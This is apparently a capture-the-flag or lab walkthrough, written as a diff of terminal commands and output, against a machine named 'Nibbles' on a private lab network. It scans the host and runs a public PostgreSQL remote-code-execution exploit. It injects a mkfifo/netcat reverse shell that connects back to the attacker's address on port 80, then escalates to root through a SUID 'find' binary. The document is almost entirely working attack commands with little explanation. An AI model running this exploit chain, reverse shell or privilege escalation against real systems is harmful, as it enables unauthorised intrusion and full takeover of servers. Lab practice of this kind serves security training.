@@ -1,0 +1,59 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.157.47 > Nibbles.txt
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.3
+22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
+|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
+|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
+80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
+|_http-title: Enter a title, displayed at the top of the window.
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
+| ssl-cert: Subject: commonName=debian
+| Subject Alternative Name: DNS:debian
+| Issuer: commonName=debian
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-04-27T15:41:47
+| Not valid after:  2030-04-25T15:41:47
+| MD5:     b086 6d30 4913 684e 16c1 8348 fc76 fe43
+| SHA-1:   cb30 5109 0fc1 14ab 0fb9 8e55 5874 4bb5 ba57 66af
+|_SHA-256: f929 f2d5 d90f 3ff7 1775 be79 6143 57e9 50f9 29fe a771 e8c8 2d72 c181 de1f a211
+|_ssl-date: TLS randomness does not represent time
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+$ searchsploit PostgreSQL
+PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) ( | multiple/remote/50847.py
+
+$ python3 50847.py -i 192.168.157.47 -p 5437 -c id
+[+] Connecting to PostgreSQL Database on 192.168.157.47:5437
+[+] Connection to Database established
+[+] Checking PostgreSQL version
+[+] PostgreSQL 11.7 is likely vulnerable
+[+] Creating table _88d010d06ba7e28e7aa0637e524aa0d8
+[+] Command executed
+uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
+
+# confirm have nc
+which nc
+/usr/bin/nc
+
+$ python3 50847.py -i 192.168.157.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.242 80 >/tmp/f'
+
+$ rlwrap nc -nlvp 80 
+listening on [any] 80 ...
+connect to [192.168.45.242] from (UNKNOWN) [192.168.157.47] 59926
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
+
+postgres@nibbles:/$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/find
+postgres@nibbles:/$ find . -exec /bin/sh -p \; -quit
+# id
+uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
+
